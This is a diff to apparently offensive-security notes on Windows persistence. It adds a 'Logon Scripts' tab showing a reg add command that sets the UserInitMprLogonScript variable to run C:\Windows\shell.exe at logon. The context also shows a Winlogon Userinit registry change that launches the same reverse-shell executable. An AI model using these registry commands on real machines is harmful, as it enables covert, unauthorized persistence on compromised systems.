@@ -43,8 +43,16 @@ If we'd replace any of the executables with some reverse shell, we would break t
 ```bash
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\Userinit.exe, C:\Windows\shell.exe" /f
 ```
+{% endtab %}
 
+{% tab title="Logon Scripts" %}
+One of the things userinit.exe does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine.  
 
+```bash
+reg add "HKCU\Environment" /v UserInitMprLogonScript /d "C:\Windows\shell.exe" /f
+```
 
 {% endtab %}
+
+
 {% endtabs %}
